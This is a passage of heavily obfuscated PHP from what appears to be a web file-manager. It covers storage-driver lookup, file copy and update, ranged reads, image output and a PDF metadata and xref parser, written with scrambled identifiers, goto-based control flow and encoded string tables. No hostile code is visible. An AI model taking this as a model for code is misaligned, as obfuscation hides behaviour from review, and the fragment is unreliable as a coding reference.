$B†¨ÓÑöáÏ->getPath(rtrim($BĞ›Ş³—˜Á, $FºÁÜ²ÑÚù[8]) . $FºÁÜ²ÑÚù[8] . $fÚ’¬÷µ); $bƒŠêŒö¯ = $FºÁÜ²ÑÚù[1027] . time() . rand_string(5); goto Fõ»Âö¹•; DÛà’ß÷¿Ÿ: mk_dir($aàÇ–óŠ§¤); $A±ê˜­ÇñÈ = $aàÇ–óŠ§¤ . $bƒŠêŒö¯; $A±ê˜­ÇñÈ = $dàÙ¼‹Ó¾->download($d”íÆŒÀ—¡, $A±ê˜­ÇñÈ); goto A®°è¥¥‰Ã; A®°è¥¥‰Ã: $A±ê˜­ÇñÈ = $dàÙ¼‹Ó¾->iconvApp($A±ê˜­ÇñÈ); $D¼‡ÀùœÁ— = $B†¨ÓÑöáÏ->upload($BĞ›Ş³—˜Á, $A±ê˜­ÇñÈ, $b¦Ÿ á‚Ü‡); self::remove($aàÇ–óŠ§¤ . $bƒŠêŒö¯); goto eÈ²©ñ™ÚÒ; Aª±‚èŠË¨: } public static function pathFather($AãŠªôÅî) { $c·ÊŠåŞ˜¡ = IO::init($AãŠªôÅî); $bªÙ°ãªâ÷ = $c·ÊŠåŞ˜¡->pathFather($c·ÊŠåŞ˜¡->path); return $c·ÊŠåŞ˜¡->getPathOuter($bªÙ°ãªâ÷); } public static function fileOut($DåŒ“ˆ, $A™·ìƒ×§¨ = false, $EÅœœªŒ®¡ = false, $F¾Ûª¼¯–Œ = '') { $D´šË‘Ü¶‰ = self::driverMake($DåŒ“ˆ); if ($D´šË‘Ü¶‰->isFileOutServer()) { return $D´šË‘Ü¶‰->fileOutServer($DåŒ“ˆ, $A™·ìƒ×§¨, $EÅœœªŒ®¡, $F¾Ûª¼¯–Œ); } return $D´šË‘Ü¶‰->fileOut($DåŒ“ˆ, $A™·ìƒ×§¨, $EÅœœªŒ®¡, $F¾Ûª¼¯–Œ); } public static function fileOutImage($d¿ìÍéÈ¹®, $f•ÜöÃÔ¦ = 250) { $dÒ¨³ù­ö» = array(250, 600, 1200, 3000, 5000); for ($Fè‹•¶Ïß¢ = 0; $Fè‹•¶Ïß¢ < count($dÒ¨³ù­ö»); $Fè‹•¶Ïß¢++) { if ($Fè‹•¶Ïß¢ == 0 && $f•ÜöÃÔ¦ <= $dÒ¨³ù­ö»[$Fè‹•¶Ïß¢]) { $f•ÜöÃÔ¦ = $dÒ¨³ù­ö»[$Fè‹•¶Ïß¢]; break; } else { if ($f•ÜöÃÔ¦ > $dÒ¨³ù­ö»[$Fè‹•¶Ïß¢ - 1] && $f•ÜöÃÔ¦ <= $dÒ¨³ù­ö»[$Fè‹•¶Ïß¢]) { $f•ÜöÃÔ¦ = $dÒ¨³ù­ö»[$Fè‹•¶Ïß¢]; break; } else { if ($Fè‹•¶Ïß¢ == count($dÒ¨³ù­ö») - 1 && $f•ÜöÃÔ¦ > $dÒ¨³ù­ö»[$Fè‹•¶Ïß¢]) { $f•ÜöÃÔ¦ = $dÒ¨³ù­ö»[$Fè‹•¶Ïß¢]; break; } } } } $F‘½ÛÔ‚¶ = self::driverMake($d¿ìÍéÈ¹®); if ($F‘½ÛÔ‚¶->isFileOutServer()) { return $F‘½ÛÔ‚¶->fileOutImageServer($d¿ìÍéÈ¹®, $f•ÜöÃÔ¦); } return $F‘½ÛÔ‚¶->fileOutImage($d¿ìÍéÈ¹®, $f•ÜöÃÔ¦); } private static function driverIsSame($EÄä¨Îè˜ƒ, $a‘êŠ”°¹•) { goto dë¾…™×£¹; BÕì’ØÃéã: if ($EÄä¨Îè˜ƒ->pathDriver == $a‘êŠ”°¹•->pathDriver) { return !0; } return !1; goto A‚„ÙÊÁµß; C†êŒò™•: if ($aËå»Ù¥×í != $EöÜÆùäÂÅ) { return !1; } if ($aËå»Ù¥×í == $d¥ÆÃá²ñ[721]) { return !0; } if ($aËå»Ù¥×í == $d¥ÆÃá²ñ[102]) { return !0; } goto BÕì’ØÃéã; dë¾…™×£¹: $d¥ÆÃá²ñ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aËå»Ù¥×í = $EÄä¨Îè˜ƒ->getType(); $EöÜÆùäÂÅ = $a‘êŠ”°¹•->getType(); goto C†êŒò™•; A‚„ÙÊÁµß: } public static function copyUpdate($A¯¶İæ²¬Ä, $cæ…Æ½ÅîÙ) { goto d½¥È¦ÅÄº; B¨¶åØŒÌÏ: $c‚ØèŞ‚ÖÕ = self::_listAll($A¯¶İæ²¬Ä); $BÓàó‰ÖŠ´ = self::_listAll($cæ…Æ½ÅîÙ); $d‚Å—æÊ…£ = array(); goto Bß³Õ“ŸÖ‡; eêö¿ğæÜ: Hook::trigger($bˆğ°–ã¢Î[1033], $A¯¶İæ²¬Ä, $cæ…Æ½ÅîÙ, $A«¢†ğºÚÉ); foreach ($dğËÉÏ– as $Cğ„±â¿ø) { IO::mkdir($Cğ„±â¿ø); } foreach ($d‚Å—æÊ…£ as $Cğ„±â¿ø) { IO::copy($Cğ„±â¿ø[$bˆğ°–ã¢Î[1030]], $Cğ„±â¿ø[$bˆğ°–ã¢Î[1031]], REPEAT_REPLACE); } goto EŠ¦ïÉò‡; Bß³Õ“ŸÖ‡: $dğËÉÏ– = array(); foreach ($c‚ØèŞ‚ÖÕ as $eïéÛ¿Ë¨ => $Cğ„±â¿ø) { if (isset($BÓàó‰ÖŠ´[$eïéÛ¿Ë¨])) { if ($Cğ„±â¿ø[$bˆğ°–ã¢Î[76]] == 1) { continue; } if ($BÓàó‰ÖŠ´[$eïéÛ¿Ë¨][$bˆğ°–ã¢Î[77]] == $Cğ„±â¿ø[$bˆğ°–ã¢Î[77]]) { continue; } } if ($Cğ„±â¿ø[$bˆğ°–ã¢Î[76]] == 1) { $dğËÉÏ–[] = $cæ…Æ½ÅîÙ . $bˆğ°–ã¢Î[8] . $eïéÛ¿Ë¨; continue; } $EçöÜß£»Â = strstr(trim($eïéÛ¿Ë¨, $bˆğ°–ã¢Î[8]), $bˆğ°–ã¢Î[8]) ? get_path_father($eïéÛ¿Ë¨) : $bˆğ°–ã¢Î[33]; $d‚Å—æÊ…£[] = array($bˆğ°–ã¢Î[1030] => $Cğ„±â¿ø[$bˆğ°–ã¢Î[75]], $bˆğ°–ã¢Î[1031] => rtrim($cæ…Æ½ÅîÙ, $bˆğ°–ã¢Î[8]) . $bˆğ°–ã¢Î[8] . $EçöÜß£»Â, $bˆğ°–ã¢Î[1032] => $Cğ„±â¿ø); } $A«¢†ğºÚÉ = array($bˆğ°–ã¢Î[171] => $d‚Å—æÊ…£, $bˆğ°–ã¢Î[76] => $dğËÉÏ–); goto eêö¿ğæÜ; d½¥È¦ÅÄº: $bˆğ°–ã¢Î =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!IO::exist($A¯¶İæ²¬Ä)) { return !1; } if (!IO::exist($cæ…Æ½ÅîÙ)) { IO::mkdir($cæ…Æ½ÅîÙ); } goto B¨¶åØŒÌÏ; EŠ¦ïÉò‡: } private static function _listAll($bÑ§„Ï®) { $bé”Œ³›òæ =& $_SERVER[åÌÛ»ô¢‚ö™]; $bÑ§„Ï® = KodIO::clear($bÑ§„Ï®); $EØ·³ô¾§ = IO::listAll($bÑ§„Ï®); foreach ($EØ·³ô¾§ as &$DˆÄ‰ö«ŒØ) { $D°¶ÁÄóÂ¥ = substr($DˆÄ‰ö«ŒØ[$bé”Œ³›òæ[75]], strlen($bÑ§„Ï®)); $DˆÄ‰ö«ŒØ[$bé”Œ³›òæ[1034]] = trim($D°¶ÁÄóÂ¥, $bé”Œ³›òæ[8]); } unset($DˆÄ‰ö«ŒØ); return array_to_keyvalue($EØ·³ô¾§, $bé”Œ³›òæ[1034]); } public static function fileSubstr($a ¿†îåõî, $b»Ë««¦ˆ½, $aèÎÛöÏÍ¨ = false) { goto CäÉÌé; C¿Ş˜…ÚÃÊ: if ($aèÎÛöÏÍ¨ === !1) { $aèÎÛöÏÍ¨ = $C¯ÙÊê Í‰ - $b»Ë««¦ˆ½; } if ($b»Ë««¦ˆ½ + $aèÎÛöÏÍ¨ > $C¯ÙÊê Í‰) { $aèÎÛöÏÍ¨ = $C¯ÙÊê Í‰ - $b»Ë««¦ˆ½; } if (!$C¯ÙÊê Í‰ && $c¦§ß‡Ú½®->getType() == $Dõø £ÒÖ[102] && !$c¦§ß‡Ú½®->exist($a ¿†îåõî)) { throw new Exception($Dõø £ÒÖ[1035] . LNG($Dõø £ÒÖ[1036])); } goto b£‘î÷ÆÔ; aÃ‡ƒ±°¼: if (!$D™æ§íÃ¥« && $aèÎÛöÏÍ¨ && isset($GLOBALS[$Dõø £ÒÖ[1037]])) { throw new Exception($GLOBALS[$Dõø £ÒÖ[1037]][$Dõø £ÒÖ[1038]]); } return $D™æ§íÃ¥«; goto D¤çù§ÀŒ; CÖ¨·á…˜ù: $d„ˆÉ‚Ë  = $b»Ë««¦ˆ½; $f¾Ş™²Ë˜Ì = $aèÎÛöÏÍ¨; if ($b»Ë««¦ˆ½ < 0) { $b»Ë««¦ˆ½ = $C¯ÙÊê Í‰ + $b»Ë««¦ˆ½; } goto C¿Ş˜…ÚÃÊ; b£‘î÷ÆÔ: if ($aèÎÛöÏÍ¨ <= 0) { return $Dõø £ÒÖ[33]; } if ($b»Ë««¦ˆ½ < 0 || $b»Ë««¦ˆ½ >= $C¯ÙÊê Í‰ || $aèÎÛöÏÍ¨ > 1024 * 1024 * 5) { throw new Exception("\146\x69\154\145\x52\145\x61\x64\40\145\x72\x72\157\x72\x21\x20\163\164\141\162\164\x3d{$b»Ë««¦ˆ½}\x3b\x6c\145\156\x67\x74\x68\75{$aèÎÛöÏÍ¨}\73\40\x73\151\172\x65\75{$C¯ÙÊê Í‰}\73"); } $D™æ§íÃ¥« = $c¦§ß‡Ú½®->fileSubstr($a ¿†îåõî, $b»Ë««¦ˆ½, $aèÎÛöÏÍ¨); goto aÃ‡ƒ±°¼; CäÉÌé: $Dõø £ÒÖ =& $_SERVER[åÌÛ»ô¢‚ö™]; $c¦§ß‡Ú½® = self::driverMake($a ¿†îåõî); $C¯ÙÊê Í‰ = $c¦§ß‡Ú½®->size($a ¿†îåõî); goto CÖ¨·á…˜ù; D¤çù§ÀŒ: } private static function driverMake(&$bÉ†„¥Õš—) { goto e„×Õƒ´††; F¤™«ØºÈ: return $Aº¼å†¡÷; goto A‡Ã½Û“; BÁ¿êŒ¶¯¬: if ($bíàà¶™Æ[$aÄ³·•Æï[29]] == KodIO::KOD_IO && !self::$driverListSystem[$bíàà¶™Æ[$aÄ³·•Æï[392]]]) { return !1; } $bÉ†„¥Õš— = $bíàà¶™Æ[$aÄ³·•Æï[1039]]; $Aº¼å†¡÷ = self::driverGet($bíàà¶™Æ, $bÉ†„¥Õš—); goto F¤™«ØºÈ; e„×Õƒ´††: $aÄ³·•Æï =& $_SERVER[åÌÛ»ô¢‚ö™]; $bíàà¶™Æ = KodIO::parse($bÉ†„¥Õš—); if (!self::$driverListSystem) { $F´²Æ¸¿é’ = Model($aÄ³·•Æï[730])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($F´²Æ¸¿é’, $aÄ³·•Æï[392]); } goto BÁ¿êŒ¶¯¬; A‡Ã½Û“: } private static function driverGet($f•¨°áÖ, &$eµ–Õ¹É™ƒ) { goto d•÷Œ«ĞÅÆ; d•÷Œ«ĞÅÆ: $B¯˜‘º£¼ƒ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aåŠÉ¨ŒÛ = $f•¨°áÖ[$B¯˜‘º£¼ƒ[1040]]; $C—Ò¾‰”Ï¨ = $f•¨°áÖ[$B¯˜‘º£¼ƒ[392]]; goto dóá×ãº³ö; EÃÆÓÊ©ğ‰: if (isset($eÁß§ÕÀé[$B¯˜‘º£¼ƒ[6]][$B¯˜‘º£¼ƒ[1051]])) { $DòÌ÷ßíƒĞ->pathBase = rtrim($eÁß§ÕÀé[$B¯˜‘º£¼ƒ[6]][$B¯˜‘º£¼ƒ[1051]], $B¯˜‘º£¼ƒ[8]) . $B¯˜‘º£¼ƒ[8]; $eµ–Õ¹É™ƒ = $DòÌ÷ßíƒĞ->pathBase . ltrim($eµ–Õ¹É™ƒ, $B¯˜‘º£¼ƒ[8]); } $eµ–Õ¹É™ƒ = $DòÌ÷ßíƒĞ->getPath($eµ–Õ¹É™ƒ); if (isset($f•¨°áÖ[$B¯˜‘º£¼ƒ[1021]])) { $eµ–Õ¹É™ƒ = $f•¨°áÖ[$B¯˜‘º£¼ƒ[1021]]; } goto dâ¦·äØÏ£; dĞÛäëÖõ÷: $DòÌ÷ßíƒĞ = self::$driverCache[$cùİç­„]; $DòÌ÷ßíƒĞ->pathDriver = $aåŠÉ¨ŒÛ; $DòÌ÷ßíƒĞ->pathBase = $B¯˜‘º£¼ƒ[33]; goto EÃÆÓÊ©ğ‰; dâ¦·äØÏ£: $DòÌ÷ßíƒĞ->path = $eµ–Õ¹É™ƒ; return $DòÌ÷ßíƒĞ; goto e‘‡·ªİŸæ; dóá×ãº³ö: switch ($f•¨°áÖ[$B¯˜‘º£¼ƒ[29]]) { case KodIO::KOD_IO: $eÁß§ÕÀé = self::$driverListSystem[$C—Ò¾‰”Ï¨]; break; case KodIO::KOD_SOURCE: $eµ–Õ¹É™ƒ = $C—Ò¾‰”Ï¨ . $eµ–Õ¹É™ƒ; $eÁß§ÕÀé = array($B¯˜‘º£¼ƒ[1041] => $B¯˜‘º£¼ƒ[1042], $B¯˜‘º£¼ƒ[6] => $f•¨°áÖ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $a“Û†ø»îÊ = $GLOBALS[$B¯˜‘º£¼ƒ[1043]]; self::$driverListUser = array_to_keyvalue($a“Û†ø»îÊ, $B¯˜‘º£¼ƒ[392]); } $eÁß§ÕÀé = self::$driverListUser[$C—Ò¾‰”Ï¨]; break; case KodIO::KOD_SHARE_LINK: $eÁß§ÕÀé = array($B¯˜‘º£¼ƒ[1041] => $B¯˜‘º£¼ƒ[1044], $B¯˜‘º£¼ƒ[6] => $f•¨°áÖ); $Dã…ä³é‹ = Action($B¯˜‘º£¼ƒ[1045])->sharePathInfo($f•¨°áÖ[$B¯˜‘º£¼ƒ[75]]); $eµ–Õ¹É™ƒ = $Dã…ä³é‹[$B¯˜‘º£¼ƒ[394]]; if (!$Dã…ä³é‹[$B¯˜‘º£¼ƒ[394]]) { $B×öíËôË = Model($B¯˜‘º£¼ƒ[561])->getInfo($Dã…ä³é‹[$B¯˜‘º£¼ƒ[465]]); $eµ–Õ¹É™ƒ = KodIO::clear($B×öíËôË[$B¯˜‘º£¼ƒ[1046]] . $f•¨°áÖ[$B¯˜‘º£¼ƒ[1039]]); $f•¨°áÖ[$B¯˜‘º£¼ƒ[463]] = $B×öíËôË; $f•¨°áÖ[$B¯˜‘º£¼ƒ[1021]] = $eµ–Õ¹É™ƒ; $eÁß§ÕÀé = array($B¯˜‘º£¼ƒ[1041] => $B¯˜‘º£¼ƒ[1047], $B¯˜‘º£¼ƒ[6] => $f•¨°áÖ); } break; case KodIO::KOD_SHARE_ITEM: $eÁß§ÕÀé = array($B¯˜‘º£¼ƒ[1041] => $B¯˜‘º£¼ƒ[1048], $B¯˜‘º£¼ƒ[6] => $f•¨°áÖ); $B×öíËôË = Model($B¯˜‘º£¼ƒ[561])->getInfo($f•¨°áÖ[$B¯˜‘º£¼ƒ[392]]); if ($B×öíËôË[$B¯˜‘º£¼ƒ[394]] == $B¯˜‘º£¼ƒ[494]) { $eµ–Õ¹É™ƒ = KodIO::clear($B×öíËôË[$B¯˜‘º£¼ƒ[1046]] . $f•¨°áÖ[$B¯˜‘º£¼ƒ[1039]]); $f•¨°áÖ[$B¯˜‘º£¼ƒ[463]] = $B×öíËôË; $f•¨°áÖ[$B¯˜‘º£¼ƒ[1021]] = $eµ–Õ¹É™ƒ; $eÁß§ÕÀé = array($B¯˜‘º£¼ƒ[1041] => $B¯˜‘º£¼ƒ[1049], $B¯˜‘º£¼ƒ[6] => $f•¨°áÖ); } else { if (!$eµ–Õ¹É™ƒ) { $eµ–Õ¹É™ƒ = $B×öíËôË[$B¯˜‘º£¼ƒ[394]]; } } break; default: $eµ–Õ¹É™ƒ = $f•¨°áÖ[$B¯˜‘º£¼ƒ[75]]; $eÁß§ÕÀé = array($B¯˜‘º£¼ƒ[1041] => $B¯˜‘º£¼ƒ[1050]); break; } $cùİç­„ = $f•¨°áÖ[$B¯˜‘º£¼ƒ[75]]; if (!isset(self::$driverCache[$cùİç­„])) { $c—ù¤ì¿– = strtolower($eÁß§ÕÀé[$B¯˜‘º£¼ƒ[90]]); $B¤¦Ù™Şš = $GLOBALS[$B¯˜‘º£¼ƒ[6]][$B¯˜‘º£¼ƒ[84]][$B¯˜‘º£¼ƒ[779]]; $C¹ƒå§Ÿƒ± = $B¯˜‘º£¼ƒ[71] . (isset($B¤¦Ù™Şš[$c—ù¤ì¿–]) ? $B¤¦Ù™Şš[$c—ù¤ì¿–] : ucfirst($c—ù¤ì¿–)); if (!class_exists($C¹ƒå§Ÿƒ±)) { show_json("{$C¹ƒå§Ÿƒ±}\x20\x6e\x6f\x74\x20\145\x78\x69\163\164\163\x21", !1); } $Eèº¶«æ‹Ö = isset($eÁß§ÕÀé[$B¯˜‘º£¼ƒ[6]]) ? $eÁß§ÕÀé[$B¯˜‘º£¼ƒ[6]] : !1; self::$driverCache[$cùİç­„] = new $C¹ƒå§Ÿƒ±($Eèº¶«æ‹Ö); } goto dĞÛäëÖõ÷; e‘‡·ªİŸæ: } } goto aø‰àÀ£Ò”; B”œÚÂºÆÆ: define($_SERVER[åÌÛ»ô¢‚ö™][242], 2); define($_SERVER[åÌÛ»ô¢‚ö™][243], 3); define($_SERVER[åÌÛ»ô¢‚ö™][244], 1); goto cô¹ŞÎï­¦; A’ÙˆÓµÆ•: class FileParsePdf { public static function parse($EÇ¥‡†ƒš) { goto Cª¿¥ˆĞ‹; BÇùáš¯³à: preg_match($D·²Ÿ›»‰ä, $a˜ÄÅùé¶[$EÅ­ğ¾’¬ã[1567]], $Bˆ„¯¼×ˆß); if (!$Dø¤ñ¶‘ÇŸ[$EÅ­ğ¾’¬ã[162]] && count($Bˆ„¯¼×ˆß) == 5) { $Dø¤ñ¶‘ÇŸ[$EÅ­ğ¾’¬ã[162]] = $Bˆ„¯¼×ˆß[3]; $Dø¤ñ¶‘ÇŸ[$EÅ­ğ¾’¬ã[163]] = $Bˆ„¯¼×ˆß[4]; } preg_match($EÅ­ğ¾’¬ã[1570], $a˜ÄÅùé¶[$EÅ­ğ¾’¬ã[1566]], $Bˆ„¯¼×ˆß); goto Fºäªî¦£Á; A·­ÆãËˆÒ: if ($Bˆ„¯¼×ˆß[1] && $Dø¤ñ¶‘ÇŸ[$EÅ­ğ¾’¬ã[1571]] < $Bˆ„¯¼×ˆß[1][0]) { $Dø¤ñ¶‘ÇŸ[$EÅ­ğ¾’¬ã[1571]] = $Bˆ„¯¼×ˆß[1][0]; } $Dø¤ñ¶‘ÇŸ = self::parseInfoItem($Dø¤ñ¶‘ÇŸ); return $Dø¤ñ¶‘ÇŸ; goto C†çÉÍÏØÖ; bä´‘÷°Á: preg_match_all($D·²Ÿ›»‰ä, $a˜ÄÅùé¶[$EÅ­ğ¾’¬ã[1566]], $Bˆ„¯¼×ˆß); if ($Bˆ„¯¼×ˆß[1] && $Dø¤ñ¶‘ÇŸ[$EÅ­ğ¾’¬ã[1571]] < $Bˆ„¯¼×ˆß[1][0]) { $Dø¤ñ¶‘ÇŸ[$EÅ­ğ¾’¬ã[1571]] = $Bˆ„¯¼×ˆß[1][0]; } preg_match_all($D·²Ÿ›»‰ä, $a˜ÄÅùé¶[$EÅ­ğ¾’¬ã[1567]], $Bˆ„¯¼×ˆß); goto A·­ÆãËˆÒ; D¥›ÄÒÆÁô: if ($eöŠÄ´…Äî) { $a¦„ÃÏ­ñ = $eöŠÄ´…Äî[$EÅ­ğ¾’¬ã[1568]][$EÅ­ğ¾’¬ã[1219]]; $Dø¤ñ¶‘ÇŸ = self::getObjectValue($a˜ÄÅùé¶, $eöŠÄ´…Äî, $a¦„ÃÏ­ñ); } $Dø¤ñ¶‘ÇŸ = is_array($Dø¤ñ¶‘ÇŸ) ? $Dø¤ñ¶‘ÇŸ : array(); $Dø¤ñ¶‘ÇŸ[$EÅ­ğ¾’¬ã[162]] = 0; goto FÕ¬ŠÚÀê¾; FÕ¬ŠÚÀê¾: $D·²Ÿ›»‰ä = $EÅ­ğ¾’¬ã[1569]; preg_match($D·²Ÿ›»‰ä, $a˜ÄÅùé¶[$EÅ­ğ¾’¬ã[1566]], $Bˆ„¯¼×ˆß); if (!$Dø¤ñ¶‘ÇŸ[$EÅ­ğ¾’¬ã[162]] && count($Bˆ„¯¼×ˆß) == 5) { $Dø¤ñ¶‘ÇŸ[$EÅ­ğ¾’¬ã[162]] = $Bˆ„¯¼×ˆß[3]; $Dø¤ñ¶‘ÇŸ[$EÅ­ğ¾’¬ã[163]] = $Bˆ„¯¼×ˆß[4]; } goto BÇùáš¯³à; Cª¿¥ˆĞ‹: $EÅ­ğ¾’¬ã =& $_SERVER[åÌÛ»ô¢‚ö™]; $aÓ¼¢‹ÑÌ¾ = 32 * 1024; $a˜ÄÅùé¶ = array($EÅ­ğ¾’¬ã[806] => fopen($EÇ¥‡†ƒš, $EÅ­ğ¾’¬ã[1195]), $EÅ­ğ¾’¬ã[75] => $EÇ¥‡†ƒš, $EÅ­ğ¾’¬ã[77] => filesize_64($EÇ¥‡†ƒš), $EÅ­ğ¾’¬ã[1565] => $aÓ¼¢‹ÑÌ¾); goto Fé­ßÁ§½”; Fé­ßÁ§½”: $a˜ÄÅùé¶[$EÅ­ğ¾’¬ã[1566]] = StreamWrapperIO::read($EÇ¥‡†ƒš, 0, $aÓ¼¢‹ÑÌ¾); $a˜ÄÅùé¶[$EÅ­ğ¾’¬ã[1567]] = StreamWrapperIO::read($EÇ¥‡†ƒš, $a˜ÄÅùé¶[$EÅ­ğ¾’¬ã[77]] - $aÓ¼¢‹ÑÌ¾, $aÓ¼¢‹ÑÌ¾); $eöŠÄ´…Äî = self::decodeXref($a˜ÄÅùé¶); goto D¥›ÄÒÆÁô; Fºäªî¦£Á: if ($Bˆ„¯¼×ˆß) { $Dø¤ñ¶‘ÇŸ[$EÅ­ğ¾’¬ã[1367]] = $Bˆ„¯¼×ˆß[1]; } $Dø¤ñ¶‘ÇŸ[$EÅ­ğ¾’¬ã[1571]] = 0; $D·²Ÿ›»‰ä = $EÅ­ğ¾’¬ã[1572]; goto bä´‘÷°Á; C†çÉÍÏØÖ: } private static function parseInfoItem($F•äãšÛ†) { $fÃç­Å¶¼ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$F•äãšÛ†) { return !1; } $E½­· ½áŠ = array($fÃç­Å¶¼[1368] => array($fÃç­Å¶¼[1573], $fÃç­Å¶¼[33]), $fÃç­Å¶¼[1574] => array($fÃç­Å¶¼[1575], $fÃç­Å¶¼[33]), $fÃç­Å¶¼[200] => array($fÃç­Å¶¼[1576], $fÃç­Å¶¼[228]), $fÃç­Å¶¼[107] => array($fÃç­Å¶¼[1577], $fÃç­Å¶¼[228]), $fÃç­Å¶¼[1571] => array($fÃç­Å¶¼[1571], $fÃç­Å¶¼[291]), $fÃç­Å¶¼[162] => array($fÃç­Å¶¼[162], $fÃç­Å¶¼[291]), $fÃç­Å¶¼[163] => array($fÃç­Å¶¼[163], $fÃç­Å¶¼[291]), $fÃç­Å¶¼[1578] => array($fÃç­Å¶¼[1579], $fÃç­Å¶¼[33]), $fÃç­Å¶¼[1580] => array($fÃç­Å¶¼[1581], $fÃç­Å¶¼[33]), $fÃç­Å¶¼[1582] => array($fÃç­Å¶¼[1367], $fÃç­Å¶¼[33])); $c×Ø’¼Œ¬ = array(); foreach ($E½­· ½áŠ as $DŒ¹ø­ëĞ => $dâÃÚÓ‚¯â) { if (!isset($F•äãšÛ†[$dâÃÚÓ‚¯â[0]])) { continue; } $cÏÚ¥¾¢¤ = $F•äãšÛ†[$dâÃÚÓ‚¯â[0]]; if (!$cÏÚ¥¾¢¤ || is_array($cÏÚ¥¾¢¤)) { continue; } switch ($dâÃÚÓ‚¯â[1]) { case $fÃç­Å¶¼[291]: $cÏÚ¥¾¢¤ = intval($cÏÚ¥¾¢¤); break; case $fÃç­Å¶¼[228]: if (substr($cÏÚ¥¾¢¤, 0, 2) == $fÃç­Å¶¼[1583]) { $cÏÚ¥¾¢¤ = substr($cÏÚ¥¾¢¤, 2, 14); } if (strtotime($cÏÚ¥¾¢¤)) { $cÏÚ¥¾¢¤ = date($fÃç­Å¶¼[1584], strtotime($cÏÚ¥¾¢¤)); } break; } $c×Ø’¼Œ¬[$DŒ¹ø­ëĞ] = $cÏÚ¥¾¢¤; } return $c×Ø’¼Œ¬; } private static function decodeXref(&$dó¼¤Í´ğç) { goto fÚØ—à¤‘›; eùéñ—Õ–•: if (preg_match($fò¹í…åâ‹[1592], $bö¬â²ŒÁ³, $CÆ±Ş‚ ƒ) > 0) { $D‚µ–íÏâ[$fò¹í…åâ‹[1568]][$fò¹í…åâ‹[77]] = intval($CÆ±Ş‚ ƒ[1]); } if (preg_match($fò¹í…åâ‹[1593], $bö¬â²ŒÁ³, $CÆ±Ş‚ ƒ) > 0) { $D‚µ–íÏâ[$fò¹í…åâ‹[1568]][$fò¹í…åâ‹[1594]] = intval($CÆ±Ş‚ ƒ[1]) . $fò¹í…åâ‹[70] . intval($CÆ±Ş‚ ƒ[2]); } if (preg_match($fò¹í…åâ‹[1595], $bö¬â²ŒÁ³, $CÆ±Ş‚ ƒ) > 0) { $D‚µ–íÏâ[$fò¹í…åâ‹[1568]][$fò¹í…åâ‹[1596]] = intval($CÆ±Ş‚ ƒ[1]) . $fò¹í…åâ‹[70] . intval($CÆ±Ş‚ ƒ[2]); } goto dˆÓ‹´ŒÇ; c®ôãÍÁÊ’: $EßğİÍ½…Ñ = $fò¹í…åâ‹[1586]; if (!preg_match_all($EßğİÍ½…Ñ, $f×µ£°æƒº, $CÆ±Ş‚ ƒ, PREG_SET_ORDER, 0)) { return !1; } $AÑÂùê¤ğ = intval($CÆ±Ş‚ ƒ[0][1]); goto eæŸêàˆ˜; dˆÓ‹´ŒÇ: if (preg_match($fò¹í…åâ‹[1597], $bö¬â²ŒÁ³, $CÆ±Ş‚ ƒ) > 0) { $D‚µ–íÏâ[$fò¹í…åâ‹[1568]][$fò¹í…åâ‹[1219]] = intval($CÆ±Ş‚ ƒ[1]) . $fò¹í…åâ‹[70] . intval($CÆ±Ş‚ ƒ[2]); } if (preg_match($fò¹í…åâ‹[1598], $bö¬â²ŒÁ³, $CÆ±Ş‚ ƒ) > 0) { $D‚µ–íÏâ[$fò¹í…åâ‹[1568]][$fò¹í…åâ‹[392]] = array(); $D‚µ–íÏâ[$fò¹í…åâ‹[1568]][$fò¹í…åâ‹[392]][0] = $CÆ±Ş‚ ƒ[1]; $D‚µ–íÏâ[$fò¹í…åâ‹[1568]][$fò¹í…åâ‹[392]][1] = $CÆ±Ş‚ ƒ[2]; } if (!$D‚µ–íÏâ[$fò¹í…åâ‹[1568]][$fò¹í…åâ‹[1219]]) { return !1; } goto cîÛ±ªˆÍ“; fÚØ—à¤‘›: $fò¹í…åâ‹ =& $_SERVER[åÌÛ»ô¢‚ö™]; $f×µ£°æƒº = $dó¼¤Í´ğç[$fò¹í…åâ‹[1567]]; $D‚µ–íÏâ = array($fò¹í…åâ‹[1568] => array(), $fò¹í…åâ‹[1585] => array()); goto c®ôãÍÁÊ’; cîÛ±ªˆÍ“: if (preg_match($fò¹í…åâ‹[1599], $bö¬â²ŒÁ³, $CÆ±Ş‚ ƒ) > 0) { } return $D‚µ–íÏâ; goto aÖã¡‹÷‡Æ; eæŸêàˆ˜: if ($dó¼¤Í´ğç[$fò¹í…åâ‹[77]] - $AÑÂùê¤ğ > $dó¼¤Í´ğç[$fò¹í…åâ‹[1565]]) { $fÃ ƒ‘›õ‰ = 4 * $dó¼¤Í´ğç[$fò¹í…åâ‹[1565]]; $dó¼¤Í´ğç[$fò¹í…åâ‹[1565]] = $fÃ ƒ‘›õ‰; $dó¼¤Í´ğç[$fò¹í…åâ‹[1566]] = StreamWrapperIO::read($dó¼¤Í´ğç[$fò¹í…åâ‹[75]], 0, $fÃ ƒ‘›õ‰); $dó¼¤Í´ğç[$fò¹í…åâ‹[1567]] = StreamWrapperIO::read($dó¼¤Í´ğç[$fò¹í…åâ‹[75]], $dó¼¤Í´ğç[$fò¹í…åâ‹[77]] - $fÃ ƒ‘›õ‰, $fÃ ƒ‘›õ‰); $f×µ£°æƒº = $dó¼¤Í´ğç[$fò¹í…åâ‹[1567]]; } $b¤áÆö¢Ø¾ = 0; preg_match_all($fò¹í…åâ‹[1587], $f×µ£°æƒº, $CÆ±Ş‚ ƒ); goto A…ŠìÈğå; A…ŠìÈğå: foreach ($CÆ±Ş‚ ƒ[3] as $FÆØĞ¸„Æ => $C½Æ‚ÕÄ÷”) { if ($CÆ±Ş‚ ƒ[3][$FÆØĞ¸„Æ] == $fò¹í…åâ‹[1588]) { $D¬«ØÃò˜“ = $b¤áÆö¢Ø¾ . $fò¹í…åâ‹[70] . intval($CÆ±Ş‚ ƒ[2][$FÆØĞ¸„Æ]); $D‚µ–íÏâ[$fò¹í…åâ‹[1585]][$D¬«ØÃò˜“] = intval($CÆ±Ş‚ ƒ[1][$FÆØĞ¸„Æ]); ++$b¤áÆö¢Ø¾; } else { if ($CÆ±Ş‚ ƒ[3][$FÆØĞ¸„Æ] == $fò¹í…åâ‹[1589]) { ++$b¤áÆö¢Ø¾; } else { } } } if (preg_match_all($fò¹í…åâ‹[1590], $f×µ£°æƒº, 